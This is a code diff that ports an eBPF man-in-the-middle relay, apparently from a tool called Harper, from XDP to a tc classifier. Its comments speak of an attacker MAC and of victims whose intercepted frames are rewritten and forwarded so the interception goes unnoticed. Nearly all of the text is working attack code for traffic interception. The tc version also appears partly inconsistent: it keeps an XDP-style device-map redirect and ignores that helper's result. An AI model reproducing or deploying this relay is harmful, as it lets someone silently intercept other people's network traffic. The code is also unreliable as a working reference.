@@ -1,16 +1,16 @@
 /*
- * harper-ebpf: in-kernel MITM relay for Harper — XDP variant.
+ * in-kernel MITM relay for Harper — tc redirect variant.
  *
- * Attached as an XDP program on the MITM interface. For every frame whose
+ * Attached as a tc ingress filter on the MITM interface. For every frame whose
  * Ethernet destination equals the attacker MAC, we look up the correct next-hop
  * MAC in the `harper_map` BPF LRU hash map (keyed by source MAC), rewrite the
  * Ethernet header in place, then redirect the frame to the egress of the same
- * interface via a DEV map, bypassing the kernel network stack entirely (no SKB
- * allocation).
+ * interface via a DEV map, bypassing the kernel network stack.
  *
  * The maps are populated from userspace as victims are enabled/disabled.
  */
 #include <linux/bpf.h>
+#include <linux/pkt_cls.h>
 #include <linux/if_ether.h>
 #include <bpf/bpf_helpers.h>
 #include <bpf/bpf_endian.h>
@@ -44,7 +44,7 @@ struct {
 } harper_own SEC(".maps");
 
 /* DEV map: key 0 → ifindex of the egress interface.
- * XDP uses this to redirect without SKB allocation. */
+ * The kernel uses this to redirect the frame without stack traversal. */
 struct {
     __uint(type, BPF_MAP_TYPE_DEVMAP);
     __uint(max_entries, 1);
@@ -58,34 +58,34 @@ static __always_inline int mac_eq(const __u8 *a, const __u8 *b)
            a[3] == b[3] && a[4] == b[4] && a[5] == b[5];
 }
 
-SEC("xdp")
-int harper_relay(struct xdp_md *ctx)
+SEC("classifier")
+int harper_relay(struct __sk_buff *skb)
 {
-    void *data = (void *)(long)ctx->data;
-    void *data_end = (void *)(long)ctx->data_end;
+    void *data = (void *)(long)skb->data;
+    void *data_end = (void *)(long)skb->data_end;
 
     struct ethhdr *eth = data;
     if ((void *)(eth + 1) > data_end)
-        return XDP_PASS;
+        return TC_ACT_OK;
 
     __u32 own_key = 0;
     __u8 *own = bpf_map_lookup_elem(&harper_own, &own_key);
     if (!own)
-        return XDP_PASS;
+        return TC_ACT_OK;
 
     if (!mac_eq(eth->h_dest, own))
-        return XDP_PASS;
+        return TC_ACT_OK;
 
     struct mac_key key;
     __builtin_memcpy(&key.mac, eth->h_source, ETH_ALEN);
 
     __u8 *next = bpf_map_lookup_elem(&harper_map, &key);
     if (!next)
-        return XDP_DROP;
+        return TC_ACT_SHOT;
 
     __builtin_memcpy(eth->h_dest, next, ETH_ALEN);
     __builtin_memcpy(eth->h_source, own, ETH_ALEN);
 
     bpf_redirect_map(&egress_iface_map, 0, 0);
-    return XDP_REDIRECT;
+    return TC_ACT_REDIRECT;
 }
